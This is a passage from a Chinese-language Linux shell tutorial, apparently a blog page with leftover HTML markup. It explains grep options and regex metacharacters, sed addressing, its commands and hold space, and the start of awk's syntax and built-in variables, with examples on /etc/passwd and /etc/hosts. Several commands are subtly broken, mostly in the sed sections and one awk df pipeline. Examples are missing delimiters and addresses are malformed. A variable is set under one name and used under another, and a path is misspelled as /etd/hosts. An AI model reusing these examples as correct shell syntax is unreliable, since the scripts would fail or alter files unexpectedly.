class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#过滤（尽量加引号）</span></span><br><span class="line">grep [选项] PATTERN 文件 文件 文件</span><br><span class="line"></span><br><span class="line">grep -q <span class="string">"root"</span> /etc/passwd : <span class="built_in">echo</span> $?</span><br><span class="line"><span class="comment"># 返回值：</span></span><br><span class="line"><span class="comment"># 0  找到</span></span><br><span class="line"><span class="comment"># 1  没找到</span></span><br><span class="line"><span class="comment"># 2  找不到指定文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># grep的输入可以来自：文件、标准输入、管道</span></span><br><span class="line">ss -an |grep <span class="string">":22$"</span></span><br><span class="line">ll |grep <span class="string">'^d'</span>   <span class="comment"># 找出目录</span></span><br></pre></td></tr></table></figure><p>使用的元字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">grep：     使用基本元字符集  ^, $, ., *, [], [^], \&lt;\&gt;, \(\),  \&#123;\&#125;, \+, </span><br><span class="line">egrep：   使用扩展元字符集  ?, +, &#123;&#125;, |, ()</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">Note: grep也可以使用扩展元字符集，仅需再这些元字符前置一个反斜线(尖号不行)</span><br><span class="line"></span><br><span class="line">\w    所有字母与数字，称之为字符，即 [a-zA-Z0-9]</span><br><span class="line">\W    与上面相反，非字符     [^a-zA-Z0-9]</span><br><span class="line">\b    词边界</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># grep -E 或 egrep</span></span><br></pre></td></tr></table></figure><p>grep选项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-v取反，只显示不匹配的</span><br><span class="line">-i  忽略大小写</span><br><span class="line">-l      只列出匹配行所在的文件名(哪些文件里面有这些匹配)</span><br><span class="line">-n      再每一行前面加上他所在文件中的相对行号</span><br><span class="line">-c      显示成功匹配的行数</span><br><span class="line">-s      禁止显示文件不存在或文件不可读的错误信息</span><br><span class="line">-q      静默</span><br><span class="line">--color 颜色</span><br><span class="line">-R, -r  递归针对目录</span><br><span class="line">-o      只显示匹配的内容</span><br><span class="line">-B      前几行  grep -C2 <span class="string">'root'</span> /etc/passwd </span><br><span class="line">-A      后几行</span><br><span class="line">-C      上下几行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nmap --<span class="built_in">help</span> |grep <span class="string">'\-u'</span>  <span class="comment"># 查看帮助文档里的-u</span></span><br></pre></td></tr></table></figure><h4 id="八-sed"><a href="#八-sed" class="headerlink" title="八.sed"></a>八.sed</h4><p>sed: 流编辑器，在线的、非交互式的编辑器（而vi是交互式的）</p><p><strong>sed工作流程</strong></p><p>文本文件  -&gt; sed的模式空间(缓冲区)  –&gt; 输出</p><p><strong>命令格式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sed [options] 'cmd' file(s)</span></span><br><span class="line">sed [options] -f scriptfile file(s)</span><br></pre></td></tr></table></figure><blockquote><p>sed不管是够找到指定的模式，他的退出状态都是0。 只有当命令<code>语法存在错误</code>时候，才是非0</p></blockquote><p><strong>可以在命令行，也可以在脚本里面使用</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">'d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># d 删除</span></span><br><span class="line">sed <span class="string">'4d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 4d 删除第四行</span></span><br><span class="line"><span class="comment"># i 修改文件(不是输出到屏幕上)</span></span><br></pre></td></tr></table></figure><p><strong>支持正则表达式</strong></p><p>支持的元字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本元字符集: ^, $, ., *, [], [^], \&lt;\&gt;, \(\), \&#123;\&#125; </span></span><br><span class="line"><span class="comment"># 扩展元字符集: ?, +, &#123;&#125;, |, ()</span></span><br></pre></td></tr></table></figure><p>使用扩展元字符的方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sed  --<span class="built_in">help</span>|grep <span class="string">'\-r'</span></span><br><span class="line"> <span class="comment"># </span></span><br><span class="line"> \+</span><br><span class="line"> sed -r</span><br></pre></td></tr></table></figure><p>基本用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sed -r <span class="string">''</span> /etc/<span class="built_in">test</span>    <span class="comment"># '' 没任何动作</span></span><br><span class="line">sed -r <span class="string">'d'</span> /etc/<span class="built_in">test</span> </span><br><span class="line">sed -r <span class="string">'p'</span> /etc/<span class="built_in">test</span>    <span class="comment"># p 打印</span></span><br><span class="line">sed -r -n <span class="string">'p'</span> /etc/<span class="built_in">test</span>    </span><br><span class="line">sed -r -n <span class="string">'/root/p'</span> /etc/<span class="built_in">test</span>    <span class="comment"># -n  静默方式</span></span><br><span class="line"><span class="comment"># 上面四种不建议用(打印这种事情用不着sed，有别的打印就行)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 下面的功能才重点学</span></span><br><span class="line">sed -r <span class="string">'s/root/xps'</span> /etc/<span class="built_in">test</span>    <span class="comment"># 所有行查找替换,root换成大小写（只替换一次）</span></span><br><span class="line">sed -r <span class="string">'s/root/xps/g'</span> /etc/<span class="built_in">test</span>  <span class="comment"># g 全局</span></span><br><span class="line">sed -r <span class="string">'s/root/xps/gi'</span> /etc/<span class="built_in">test</span>  <span class="comment"># i  忽略大小写</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'/root/d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 没有s就是查找， 查找带root的行，然后删除</span></span><br><span class="line">sed -r <span class="string">'\#root#d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 查找：可以使用#等符号--&gt;不一定要斜线，但是前面要加\转义；查找替换:不用转义</span></span><br></pre></td></tr></table></figure><p><strong>地址(定址)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于决定对哪些行进行编辑。地址形式可以是数字、正则或二者的结合(如果没有指定,sed将处理输入文件中的所有行)</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'d'</span> /etc/<span class="built_in">test</span> </span><br><span class="line">sed -r <span class="string">'3d'</span> /etc/<span class="built_in">test</span> </span><br><span class="line">sed -r <span class="string">'1,3d'</span> /etc/<span class="built_in">test</span> </span><br><span class="line">sed -r <span class="string">'/root/d'</span> /etc/<span class="built_in">test</span>    <span class="comment"># 删除root的行</span></span><br><span class="line">sed -r <span class="string">'root/,5d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 从root行开始，到第5行删除</span></span><br><span class="line">sed -r <span class="string">'s/root/xps/g'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 替换</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'/^adm/,20d'</span> /etc/<span class="built_in">test</span>  <span class="comment"># 从adm开头的那一行，删除到第20行</span></span><br><span class="line">sed -r <span class="string">'/^adm/,+20d'</span> /etc/<span class="built_in">test</span> <span class="comment"># 从adm开头的那一行，再往后删除20行</span></span><br><span class="line">sed -r <span class="string">'/2,5d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 第二行到第五行 </span></span><br><span class="line">sed -r <span class="string">'/root/d'</span> /etc/<span class="built_in">test</span>    <span class="comment"># 带root的行删除</span></span><br><span class="line">sed -r <span class="string">'/root/!d'</span> /etc/<span class="built_in">test</span>  <span class="comment"># 除了root行以外都删除</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'1~2d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 删除所有奇数行(从1开始，每隔两行删)</span></span><br><span class="line">sed -r <span class="string">'0~2d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 删除所有偶数行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拓展：</span></span><br><span class="line">vim中： 使用 `:r /etc/passwd` 来读取文件内容</span><br></pre></td></tr></table></figure><p><strong>命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 告诉sed对指定行进行何种操作</span></span><br><span class="line">a  在当前行后添加一行或多行</span><br><span class="line">c     用新文本修改(替换)当前行中的文本</span><br><span class="line">d 删除行</span><br><span class="line">i 在当前行前插入文本</span><br><span class="line">l    列出非打印字符</span><br><span class="line">p 打印行 </span><br><span class="line">n读入下一输入行，并从下一条命令而不是第一条命令开始对其的处理</span><br><span class="line">q结束或退出sed</span><br><span class="line">!取反(对所选行以外的所有行应用)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s 用一个字符串替换另一个</span><br><span class="line">s 替换标志</span><br><span class="line">g 在行内进行全局替换</span><br><span class="line">i 忽略大小写</span><br><span class="line">r 从文件中读</span><br><span class="line">w 将行写入文件</span><br><span class="line">y将字符转换为另一个字符（不支持正则）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">h 把模式空间里的内容复制到暂存缓冲区(覆盖)</span><br><span class="line">H 把模式空间里的内容支架到暂存缓冲区中</span><br><span class="line">g 取出暂存缓冲区中的内容，将其复制到模式空间，覆盖该处原有内容</span><br><span class="line">G 取出暂存缓冲区中的内容，将其复制到模式空间，追加在原有内容后门</span><br><span class="line">x 交换暂存缓冲区域模式空间的内容</span><br></pre></td></tr></table></figure><p><strong>例子</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 例子</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># d 删除</span></span><br><span class="line">sed -r <span class="string">'3d'</span> datefile   <span class="comment"># 删除第三行</span></span><br><span class="line">sed -r <span class="string">'3d'</span> datefile</span><br><span class="line">sed -r <span class="string">'3&#123;d;&#125;'</span> datefile</span><br><span class="line">sed -r <span class="string">'3d&#123;h:d&#125;'</span> datefile  <span class="comment"># 先保存，再删除</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'3,$d'</span> datefile   <span class="comment"># 删除3到最后一行</span></span><br><span class="line">sed -r <span class="string">'$d'</span> datefile     <span class="comment"># 删除最后一行</span></span><br><span class="line">sed -r <span class="string">'/nrth/d'</span> datefile  <span class="comment"># 删除满足这个匹配的行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s 替换 </span></span><br><span class="line">sed -r <span class="string">'s/west/north/g'</span> datefile</span><br><span class="line">sed -r <span class="string">'s/^west/north/'</span> datefile      </span><br><span class="line">sed -r <span class="string">'s[0-9][0-9]$/&amp;.5'</span> datefile   <span class="comment"># &amp;代表在查找串中匹配到的内容       # 拓展vim中在某行的后门加上xxx：  :3,5s/.*/&amp;XXX/g</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#vim拓展1:    :%s/.*/#&amp;/g   在所有行前面加注释</span></span><br><span class="line"><span class="comment">#vim拓展1:    :3,5s/~/#&amp;/        和sed是一样的</span></span><br><span class="line">sed -r <span class="string">'%s/(.)(.)(.*)/\1xxx\2\3/'</span> passwd            <span class="comment"># 把每行第二个字符前面加xxx</span></span><br><span class="line">sed -r <span class="string">'s/(Mar)got/\1inane/g'</span> datefile</span><br><span class="line"></span><br><span class="line"><span class="comment"># r 读文件</span></span><br><span class="line">sed -r <span class="string">'s/Suan/r /etc/newfile'</span> datefile  <span class="comment"># 到Suan这一行的时候，读入一个新文件</span></span><br><span class="line">sed -r <span class="string">'2r /etc/hosts'</span> a.txt   <span class="comment"># 处理到第二行的时候，读入一个新文件</span></span><br><span class="line">sed -r <span class="string">'/2r /etc/hosts'</span> a.txt   <span class="comment"># /2   带有2的时候，读入...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># w 写文件</span></span><br><span class="line">sed -r <span class="string">'/north/w newfile'</span> datafile   <span class="comment"># 把north的行保存到新文件中去</span></span><br><span class="line">sed -r <span class="string">'3,$w /new.txt'</span> datafile      <span class="comment"># 第三行到最后一行，保存...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a 追加</span></span><br><span class="line">sed -r <span class="string">'/root/a 1111111'</span> datafile   <span class="comment"># 有root的行，就在后面添加11111</span></span><br><span class="line">sed -r <span class="string">'2a/ 1111111'</span> datafile       <span class="comment"># 第二行，添加 111111111</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># i 在前面插入</span></span><br><span class="line">sed -r <span class="string">'/root/i 1111111'</span> datafile    <span class="comment"># 有root的行，就在前面添加11111</span></span><br><span class="line">sed -r <span class="string">'2i/ 1111111'</span> datafile        <span class="comment"># 第二行，在前面添加 111111111</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c  修改替换</span></span><br><span class="line">sed -r <span class="string">'2c/ 1111111'</span> datafile        <span class="comment">#   第二行，替换为 111111111</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># n 获取下一行命令</span></span><br><span class="line">sed -r <span class="string">'/eastern/&#123;n; d&#125;'</span> datafile  <span class="comment"># 这行没有明显标志，用上面明显的隔山打牛</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># G g H h 暂存和取用命令</span></span><br><span class="line">sed -r  <span class="string">'1h;$G'</span> /etc/hosts   <span class="comment"># 处理到第一行时候，暂存；到最后一行，取过来  （第一行复制到最后一行）</span></span><br><span class="line">sed -r  <span class="string">'1&#123;h;d&#125;;$G'</span> /etc/hosts    <span class="comment"># 第一行移动到最后一行</span></span><br><span class="line">sed -r  <span class="string">'1h;2,$G'</span> /etc/hosts   <span class="comment"># 处理到第一行时候，暂存;到第二行和最后一行，取过来</span></span><br></pre></td></tr></table></figure><p><strong>模式空间/暂存空间</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 小写是覆盖，大写是追加</span></span><br><span class="line">模式空间   h  H --&gt;    暂存空间</span><br><span class="line">模式空间   &lt;--- g  G   暂存空间</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sed -r  <span class="string">'G;G'</span> /etc/hosts   <span class="comment"># 所有行</span></span><br><span class="line">sed -r  <span class="string">'g;g'</span> /etc/hosts   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂存空间个模式空间互相转换命令   x</span></span><br><span class="line">sed -r <span class="string">'4h; 5x; 6G'</span> /etc/hosts   <span class="comment"># 处理到第四行覆盖到暂存空间，到第五行:。。。</span></span><br></pre></td></tr></table></figure><p> <strong>反向选择</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -r <span class="string">'3d'</span> /etc/hosts</span><br><span class="line">sed -r <span class="string">'3!d'</span> /etc/hosts</span><br></pre></td></tr></table></figure><p><strong>多重编辑选项</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -e</span></span><br><span class="line">sed -r -e <span class="string">'1,3d'</span> -e <span class="string">'s/java/python/'</span> datafile   <span class="comment"># 第一行到第三行删除，后面的替换覆盖</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'2&#123;s/java/python/g; s/php/go/g&#125;'</span> datafile   <span class="comment"># 一行里面替换两次</span></span><br></pre></td></tr></table></figure><p><strong>常见操作</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">############ 常见操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除#注释行</span></span><br><span class="line">sed -ri <span class="string">'/^#/d'</span> file.conf   <span class="comment"># 这种情况必须是第一个就是注释符</span></span><br><span class="line">sed -ri <span class="string">'/^[\t]*#/d'</span> file.conf   <span class="comment"># 如果是前面有空格或tab然后才是注释符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除//注释行</span></span><br><span class="line">sed -ri <span class="string">'\Y/^[\t]*//Yd'</span> file.conf </span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除无内容空行</span></span><br><span class="line">sed -ri <span class="string">'/^[\t]*$/d'</span> file.conf </span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除注释行及空行</span></span><br><span class="line">sed -ri <span class="string">'/^[\t]*#|^[\t]*$/d'</span> file.conf </span><br><span class="line">sed -ri <span class="string">'/^[\t]*(#|$)/d'</span> file.conf </span><br><span class="line"></span><br><span class="line"><span class="comment"># #加注释（vim是一样是）</span></span><br><span class="line">:%s/.*/<span class="comment">#&amp;/g   在所有行前面加注释</span></span><br><span class="line">:3,5s/^/<span class="comment">#&amp;/        和sed是一样的</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'1,5s/^/#/'</span> c.txt</span><br><span class="line">sed -r <span class="string">'3,$ s/^#*/#/'</span> c.txt  <span class="comment"># 将行首0到多个井换成一个井</span></span><br><span class="line"><span class="comment"># 如果井前有空格或tab等</span></span><br><span class="line">sed -r <span class="string">'3,$ s/^[\t]*#*/#/'</span> c.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sed使用外部变量(使用双引号)</span></span><br><span class="line">var1=111</span><br><span class="line">sed -ri <span class="string">"3a<span class="variable">$val1</span>"</span> /etd/hosts</span><br><span class="line"></span><br><span class="line">sed -ri <span class="string">'$a'</span><span class="string">"<span class="variable">$val1</span>"</span> /etd/hosts  <span class="comment"># 第一个单引号是`最后一行`，第二个里面是变量</span></span><br><span class="line"></span><br><span class="line">sed -ri <span class="string">"\$a<span class="variable">$val1</span>"</span> /etd/hosts   <span class="comment"># 把$a转义一下也行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cat a.txt</span><br><span class="line">tac a.txt   <span class="comment"># 从后往前倒序（ sed -r '1!G; $!d' a.txt  推导一下弄明白  ）</span></span><br></pre></td></tr></table></figure><h4 id="九-awk"><a href="#九-awk" class="headerlink" title="九.awk"></a>九.awk</h4><p>   awk本身也是一种编程语言（ps:我们使用的不是纯粹的awk，而是gawk）</p><ul><li>sed是修改文件</li><li>awk是用来统计</li></ul><p><strong>语法格式</strong></p><p><code>awk [options] &#39;cmd&#39; filenames</code></p><p> options 选项</p><p><code>-F   指定分隔符，默认是空格或tab</code></p><p><strong>command</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BEGIN&#123;&#125;行处理前</span></span><br><span class="line"><span class="comment"># &#123;&#125;行处理（有几行就处理几次）</span></span><br><span class="line"><span class="comment"># END行处理后</span></span><br><span class="line"></span><br><span class="line">awk <span class="string">'BEGIN&#123;print 1/2&#125; &#123;print "ok"&#125;END&#123;print "------"&#125;'</span> /etc/hosts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># BEGIN&#123;&#125;    通常用于定义一些变量，比如: BEGIN&#123;FS=":";OFS="---"&#125;  # OFS 输出时候的字段分隔符</span></span><br><span class="line">awk <span class="string">'BEGIN&#123;FS=":"&#125; &#123;print $1&#125;'</span> passwd   <span class="comment"># 在处理之前，(FS)就指定了分隔符</span></span><br></pre></td></tr></table></figure><p><strong>awk命令格式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># awk 'pattern' filename </span></span><br><span class="line">awk <span class="string">'/root/'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># awk '&#123;action&#125;' filename </span></span><br><span class="line">awk -F: <span class="string">'&#123;print $3&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># awk 'pattern &#123;action&#125;' filename     </span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'/root/&#123;print $3&#125;'</span> /etc/passwd</span><br><span class="line">awk <span class="string">'BEGIN&#123;FS=":"&#125; /root/&#123;print $3&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># command |awk 'pattern &#123;action&#125;' </span></span><br><span class="line">df -P |grep <span class="string">'/'</span> |awk <span class="string">'$4'</span>&gt;25000 &#123;<span class="built_in">print</span> <span class="variable">$4</span>&#125;    <span class="comment"># 除去第一行，如果大于25000就打印第四列</span></span><br></pre></td></tr></table></figure><p><strong>awk工作原理</strong></p><p><img src="/shell脚本基本知识/awk工作原理.png"></p><p><strong>记录与字段相关的<code>内部变量</code></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 可以通过 man awk 查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $0  awk变量保存当前记录的内容</span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;print $0&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># NR  输入记录总的编号，显示行号</span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;print NR,$0&#125;'</span> /etc/passwd </span><br><span class="line"><span class="comment"># FNR  当前记录文件的编号(处理多个文件，每个文件重新开始编号)</span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;print FNR,$0&#125;'</span> /etc/passwd /etc/passwd  </span><br><span class="line"><span class="comment"># NF: 保存记录的字段数(这一行一共有多少字段),  $NF代表最后一个字段</span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;print $0,NF,$NF&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># FS 输入字段分隔符，默认空格或tab</span></span><br><span class="line">awk <span class="string">'BEGIN&#123;FS=":"&#125; &#123;print $0&#125;'</span> /etc/passwd              </span><br><span class="line">awk -F<span class="string">'[:\t]'</span> <span class="string">'&#123;print $0,NF,$NF&#125;'</span> /etc/passwd</span><br><span class="line"><span class="comment"># OFS 输入字段分隔符，默认空格, OFS:输出分隔符</span></span><br><span class="line">awk <span class="string">'BEGIN&#123;FS=":";OFS="+++"&#125; &#123;print $0&#125;'</span> /etc/passwd   </span><br><span class="line"></span><br><span class="line"><span class="comment"># RS --记录分隔符(区分与FS字段分隔符) 默认换行符</span></span><br><span class="line">awk <span class="string">'BEGIN&#123;RS=":"&#125; &#123;print $0&#125;'</span> /etc/passwd</span><br><span class="line"><span class="comment"># ORS </span></span><br><span class="line">awk <span class="string">'BEGIN&#123;ORS=":"&#125; &#123;print $0&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文件每一行合并为一行（ORS 输出记录分隔符）</span></span><br><span class="line">awk <span class="string">'BEGIN&#123;ORS=""&#125; &#123;print $0&#125;'</span> /etc/passwd</span><br></pre></td></tr></table></figure><p><strong>格式化输出</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.print</span></span><br><span class="line"><span class="comment"># 2.printf  可以格式化（默认没有换行，手动加\n）</span></span><br><span class="line">date |awk <span class="string">'&#123;print "Month:" $2"\nYear: " $NF&#125;'</span>  <span class="comment"># 只要不是变量，就要放到双引号里面</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># %s 字符串（-15s  15个字符，左对齐）  %f 浮点型， %d数值类型</span></span><br><span class="line">awk -F: <span class="string">'&#123;printf "%-15s %-10s %-15s\n", $1,$2,$3&#125;'</span> /etc/passwd</span><br></pre></td></tr></table></figure><p><strong>awk模式和动作</strong></p><p>模式：条件语句，复合语句，正则表达式。 包括两个特殊字典：BEGIN和END</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 